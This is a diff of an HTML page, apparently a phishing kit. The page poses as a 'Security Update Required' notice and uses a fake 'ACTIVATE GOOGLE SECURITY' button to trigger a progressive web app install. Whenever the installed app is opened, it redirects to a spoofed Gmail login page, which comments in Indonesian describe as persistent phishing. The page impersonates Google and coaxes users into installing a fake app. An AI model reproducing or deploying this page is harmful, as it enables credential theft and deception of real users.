@@ -1,68 +1,45 @@
 <!doctype html>
 <html>
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1">
-<link rel="manifest" href="manifest.json">
-<style>
-  body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 50px; }
-  .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; box-shadow: 0 4px 10px rgba(0,0,0,0.3); width: 85%; display: none; margin-top: 20px;}
-  #status { color: #9aa0a6; margin-bottom: 10px; font-size: 14px;}
-  #debug-log { font-size: 12px; color: #34a853; margin-top: 20px; text-align: left; padding: 10px; }
-</style>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="manifest" href="manifest.json">
+    <style>
+        body { font-family: sans-serif; background: #202124; color: white; text-align: center; padding-top: 15vh; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 20px; font-size: 1.2em; border-radius: 12px; font-weight: bold; cursor: pointer; width: 85%; display: none; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+    </style>
 </head>
 <body>
-  <h2>Click Button Below</h2>
-  <p id="status">wait...</p>
-  <button class="btn" id="installBtn">Click Here</button>
-  <div id="debug-log">Status: Initializing</div>
+    <h2 id="txt">Security Update Required</h2>
+    <p id="sub" style="color:#9aa0a6">Checking system compatibility...</p>
+    <button class="btn" id="go">ACTIVATE GOOGLE SECURITY</button>
 
 <script>
-const log = (msg) => {
-    document.getElementById('debug-log').innerHTML += "<br>> " + msg;
-};
-
+// 1. PERSISTENT IMPACT: Jika dibuka via Home Screen (WebAPK), langsung Phishing
 if (window.matchMedia('(display-mode: standalone)').matches) {
-    log("Standalone mode detected. Redirecting...");
     window.location.href = "login-gmail-spoof.html";
 }
 
-let deferredPrompt;
-const installBtn = document.getElementById('installBtn');
-const statusText = document.getElementById('status');
-
-log("Looking for manifest...");
+let p;
+// Register Service Worker biar syarat PWA sah
+navigator.serviceWorker.register('sw.js');
 
 window.addEventListener('beforeinstallprompt', (e) => {
-    log("Event captured! Device compatible.");
     e.preventDefault();
-    deferredPrompt = e;
-    
-    installBtn.style.display = 'block';
-    statusText.innerText = "Compatibility confirmed.";
+    p = e;
+    document.getElementById('go').style.display = 'block';
+    document.getElementById('sub').innerText = "Compatibility Confirmed.";
 });
 
-installBtn.addEventListener('click', async () => {
-    if (deferredPrompt) {
-        log("Triggering prompt...");
-        deferredPrompt.prompt();
-        const { outcome } = await deferredPrompt.userChoice;
+document.getElementById('go').onclick = async () => {
+    if (p) {
+        p.prompt();
+        const { outcome } = await p.userChoice;
         if (outcome === 'accepted') {
-            log("User accepted installation.");
-            alert("Open 'googlelogoligature' from Home Screen.");
+            alert("Module Installed. Launch 'Google' from your Home Screen.");
         }
-        deferredPrompt = null;
+        p = null;
     }
-});
-
-window.addEventListener('scroll', () => {
-    log("User interaction detected...");
-}, {once: true});
-
-if ('serviceWorker' in navigator) {
-    navigator.serviceWorker.register('sw.js').then(() => {
-        log("Service Worker Active.");
-    });
-}
+};
 </script>
 </body>
 </html>
